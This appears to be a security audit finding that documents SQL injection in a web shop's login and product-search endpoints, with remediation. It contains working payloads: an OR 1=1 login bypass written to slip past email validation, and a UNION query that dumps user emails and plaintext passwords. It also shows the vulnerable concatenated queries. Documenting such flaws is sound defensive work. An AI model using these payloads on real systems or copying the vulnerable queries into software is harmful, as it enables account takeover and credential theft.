# F01 — SQL Injection (Auth Bypass + UNION Data Dump)

| | |
|---|---|
| **ID** | F01 |
| **Severity** | Critical |
| **OWASP** | A03:2021 — Injection |
| **Location** | `app/server/src/routes/auth.ts` (login), `app/server/src/routes/products.ts` (search) |
| **Status** | Verified (automated + manual) |

## Description

Both the login endpoint and the product search endpoint build SQL queries by string
concatenation with unsanitized user input.

```ts
// auth.ts
const sql = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;

// products.ts
conds.push(`name ILIKE '%${q}%'`);
```

## How to reproduce

### 1. Auth bypass (login as any user without a password)

```http
POST /api/login
Content-Type: application/json

{"email":"x'/**/OR/**/1=1--@b.bb","password":"x"}
```

Response:

```json
{"id":1,"email":"admin@fashionhub.dev","role":"admin"}
```

Effective SQL:

```sql
SELECT * FROM users WHERE email = 'x'/**/OR/**/1=1--@b.bb' AND password = 'x'
```

The `/**/` comments replace spaces so the payload also passes the client-side
HTML5 `type=email` validation — showing client-side validation is not a security control.
The `--` comments out the password check. Result: session cookie `session=1` (admin).

Evidence: `screenshots/01a-login-sqli-bypass.png`

### 2. UNION-based data dump (extract all users + plaintext passwords)

```http
GET /api/products?q=' UNION SELECT NULL,email||' / '||password,NULL,NULL,role,NULL FROM users--
```

The `products` SELECT has 6 columns, so the UNION must match. Concatenating
`email||' / '||password` into the `name` column makes the dumped credentials visible
in the product grid UI (the card renders name/category/price only).

Response contains, among the products:

```json
{"name":"admin@fashionhub.dev / admin123","category":"admin", ...}
```

Evidence: `screenshots/01b-search-union-dump.png`

### 3. Verbose error confirms injection point

`GET /api/products?q='` returns the raw Postgres error including the stack trace and
query text (`error: unterminated quoted string at or near "' ORDER BY id"`), which
confirms the input reaches the SQL parser unescaped.

## Impact

Full authentication bypass (admin), complete dump of the users table including
plaintext passwords (see F04-6), arbitrary data exfiltration via UNION.

## Remediation

```ts
// BEFORE (vulnerable)
const sql = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
await pool.query(sql);

// AFTER (parameterized)
const { rows } = await pool.query(
  'SELECT * FROM users WHERE email = $1 AND password = $2',
  [email, password]
);
```

For the search endpoint:

```ts
// BEFORE
conds.push(`name ILIKE '%${q}%'`);

// AFTER
params.push(`%${q}%`);
conds.push(`name ILIKE $${params.length}`);
```

Plus: hash passwords (bcrypt/argon2) so a dump does not leak usable credentials,
and return generic auth errors (no user enumeration).
